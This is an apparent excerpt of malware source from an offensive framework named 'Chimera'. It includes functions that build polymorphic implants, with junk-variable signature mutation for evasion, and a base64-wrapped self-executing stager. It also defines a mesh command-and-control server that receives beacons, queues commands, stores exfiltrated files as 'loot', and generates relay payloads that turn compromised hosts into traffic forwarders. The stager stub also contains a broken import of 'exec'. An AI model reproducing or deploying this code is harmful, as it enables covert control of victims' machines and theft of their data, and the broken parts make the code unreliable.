def build_implant(agent_id: str, c2_mesh: list[str], key: bytes,
                  beacon: int = IMPLANT_BEACON_INTERVAL,
                  jitter: int = IMPLANT_JITTER_SECONDS,
                  kill_date: str = IMPLANT_KILL_DATE,
                  fail_max: int = IMPLANT_FAIL_THRESHOLD) -> str:
    """Constructs the polymorphic implant, injecting dynamic configurations and mutating bytecode signatures."""
    src = IMPLANT_SRC
    src = src.replace("AGENT_ID", agent_id)
    src = src.replace("C2_MESH", json.dumps(c2_mesh))
    src = src.replace("XOR_KEY", key.hex())
    src = src.replace("BEACON", str(beacon))
    src = src.replace("JITTER", str(jitter))
    src = src.replace("KILL_DATE", kill_date)
    src = src.replace("FAIL_MAX", str(fail_max))
    # Bytecode Signature Mutation
    junk_vars = []
    for _ in range(8):
        var_name = secrets.token_hex(6)
        var_val = secrets.token_hex(16)
        junk_vars.append(f"{var_name} = '{var_val}'")
    mutation_block = "\n".join(junk_vars)
    src = f"# {secrets.token_hex(12)}\n{mutation_block}\n" + src
    return src

def build_elf_stager(agent_id: str, c2_url: str, key: bytes,
                     beacon: int = IMPLANT_BEACON_INTERVAL,
                     jitter: int = IMPLANT_JITTER_SECONDS,
                     kill_date: str = IMPLANT_KILL_DATE,
                     fail_max: int = IMPLANT_FAIL_THRESHOLD) -> bytes:
    """Builds a compiled ELF binary by embedding the stager into a self-extracting Python stub."""
    src = ELF_STAGER_SRC
    src = src.replace("AGENT_ID", agent_id)
    src = src.replace("C2_URL", c2_url)
    src = src.replace("XOR_KEY", key.hex())
    src = src.replace("BEACON", str(beacon))
    src = src.replace("JITTER", str(jitter))
    src = src.replace("KILL_DATE", kill_date)
    src = src.replace("FAIL_MAX", str(fail_max))
    b64_src = base64.b64encode(src.encode()).decode()
    # Build a minimal self-extracting stub
    stub = f"#!/usr/bin/env python3\nimport base64,exec;exec(base64.b64decode('{b64_src}').decode())\n"
    return stub.encode()


# ============================================================
#  8. MESH C2 (SEGMENT 8: FULL IMPROVEMENT)
#  Asynchronous Decentralized Command & Control Matrix
# ============================================================
class C2:
    """HTTP(S) listener and Mesh Router. Operated by the Autopilot."""

    def __init__(self, log: ChimeraLogger, state: State, host: str = "0.0.0.0", port: int = 8443):
        self.log = log
        self.state = state
        self.host = host
        self.port = port
        self.key = OP_KEY
        self.session_token = hashlib.pbkdf2_hmac(
            'sha256', secrets.token_bytes(16), b'chimera_c2_session_salt', CRYPTO_ITERATIONS).hex()
        self.tasks: dict[str, list[dict]] = {}
        self.results: dict[str, list[dict]] = {}
        self.mesh_graph: dict[str, str] = {}
        self.runner = None
        self.site = None
        # Track agent-to-host mapping for session management
        self.agent_host_map: dict[str, str] = {}

    def _xor(self, b: bytes) -> bytes:
        k = self.key
        return bytes(c ^ k[i % len(k)] for i, c in enumerate(b))

    async def handle_beacon(self, req: aiohttp.web.Request) -> aiohttp.web.Response:
        if req.headers.get("Authorization", "") != f"Bearer {self.session_token}":
            return aiohttp.web.Response(status=403, text="FORBIDDEN")
        raw = await req.read()
        try:
            msg = json.loads(self._xor(raw).decode())
        except Exception:
            return aiohttp.web.Response(status=400, text="DECODE_ERROR")

        agent = req.headers.get("X-A", "?")
        if "meta" in msg:
            addr = msg["meta"].get("host", "?")
            host_id = await self.state.upsert_host(addr)
            self.agent_host_map[agent] = host_id
            # Open or update session
            session_rows = await self.state.q(
                "SELECT id FROM sessions WHERE id=? AND status='live'", (agent,))
            if not session_rows:
                await self.state.q_exec(
                    "INSERT OR IGNORE INTO sessions(id,host_id,kind,established,last_beacon,status,meta) "
                    "VALUES(?,?,?,?,?,?,?)",
                    (agent, host_id, "implant",
                     datetime.now(timezone.utc).isoformat(),
                     datetime.now(timezone.utc).isoformat(), "live",
                     json.dumps(msg["meta"])))
            else:
                await self.state.beacon(agent)
            self.log.sys(f"Beacon from {agent} @ {addr}")

        if "out" in msg or "file" in msg:
            self.results.setdefault(agent, []).append(msg)
            self.log.hit(f"[{agent}] Result received ({len(json.dumps(msg))}b)")
            if "file" in msg and "data" in msg:
                data = base64.b64decode(msg["data"])
                host_id = self.agent_host_map.get(agent, "")
                if host_id:
                    await self.state.add_loot(host_id, "file", msg["file"], data)

        q = self.tasks.get(agent, [])
        nxt = q.pop(0) if q else {"cmd": "sleep", "arg": IMPLANT_BEACON_INTERVAL}
        return aiohttp.web.Response(body=self._xor(json.dumps(nxt).encode()),
                                    content_type="application/octet-stream")

    async def handle_relay(self, req: aiohttp.web.Request) -> aiohttp.web.Response:
        raw = await req.read()
        agent = req.headers.get("X-A", "?")
        next_hop = self.mesh_graph.get(agent)
        if not next_hop:
            return await self.handle_beacon(req)
        try:
            headers = {k: v for k, v in req.headers.items()
                       if k.lower() in ["content-type", "x-a", "authorization"]}
            headers["User-Agent"] = random.choice(USER_AGENT_POOL)
            timeout = aiohttp.ClientTimeout(total=20)
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
                async with session.post(next_hop, data=raw, headers=headers) as r:
                    resp_data = await r.read()
                    return aiohttp.web.Response(body=resp_data, status=r.status)
        except Exception as e:
            self.log.err(f"Mesh relay forward failed for {agent}: {e}")
            return aiohttp.web.Response(status=502, text="BAD_GATEWAY")

    def queue(self, agent: str, cmd: str, arg: str = "", path: str = ""):
        task = {"cmd": cmd, "arg": arg}
        if cmd == "upload": task["path"] = path
        if cmd == "download":
            task["path"] = path
            task["data"] = arg
        self.tasks.setdefault(agent, []).append(task)
        self.log.dbg(f"Queued [{cmd}] for agent {agent}")

    def get_results(self, agent: str) -> list[dict]:
        res = self.results.get(agent, [])
        self.results[agent] = []
        return res

    async def serve(self):
        from aiohttp import web
        app = web.Application()
        app.router.add_post("/beacon", self.handle_beacon)
        app.router.add_post("/relay", self.handle_relay)
        self.runner = web.AppRunner(app)
        await self.runner.setup()
        ssl_context = None
        if os.path.exists("chimera.key") and os.path.exists("chimera.crt"):
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain("chimera.crt", "chimera.key")
        self.site = web.TCPSite(self.runner, self.host, self.port, ssl_context=ssl_context)
        await self.site.start()
        self.log.ok(f"C2 Matrix online on {self.host}:{self.port} [SSL={bool(ssl_context)}] "
                     f"[Token={self.session_token[:12]}...]")

    async def stop(self):
        if self.runner:
            await self.runner.cleanup()
            self.log.sys("C2 Matrix shut down.")

    def generate_relay_payload(self, target_agent: str, listen_port: int = MESH_RELAY_PORT_BASE) -> str:
        next_hop = f"http://{self.host}:{self.port}/relay"
        if self.host == "0.0.0.0":
            next_hop = f"http://127.0.0.1:{self.port}/relay"
        self.mesh_graph[target_agent] = next_hop
        return build_mesh_relay(next_hop, self.key, listen_port)


MESH_RELAY_SRC = textwrap.dedent('''\
import http.server, socketserver, urllib.request, ssl, threading, hashlib

NEXT_HOP = "NEXT_HOP"
LISTEN_PORT = LISTEN_PORT
XOR_KEY = bytes.fromhex("XOR_KEY")

def _decrypt(b):
    return bytes(c ^ XOR_KEY[i % len(XOR_KEY)] for i, c in enumerate(b))

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a, **kw): pass
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        try:
            req = urllib.request.Request(NEXT_HOP, data=body,
                headers={k:v for k,v in self.headers.items()})
            with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
                data = r.read()
            self.send_response(200); self.end_headers(); self.wfile.write(data)
        except Exception:
            self.send_response(502); self.end_headers()

socketserver.ThreadingTCPServer.allow_reuse_address = True
s = socketserver.ThreadingTCPServer(("0.0.0.0", LISTEN_PORT), H)
threading.Thread(target=s.serve_forever, daemon=True).start()
''')

def build_mesh_relay(next_hop: str, key: bytes, listen_port: int = MESH_RELAY_PORT_BASE) -> str:
    src = MESH_RELAY_SRC
    src = src.replace("NEXT_HOP", next_hop)
    src = src.replace("LISTEN_PORT", str(listen_port))
    src = src.replace("XOR_KEY", key.hex())
    return src


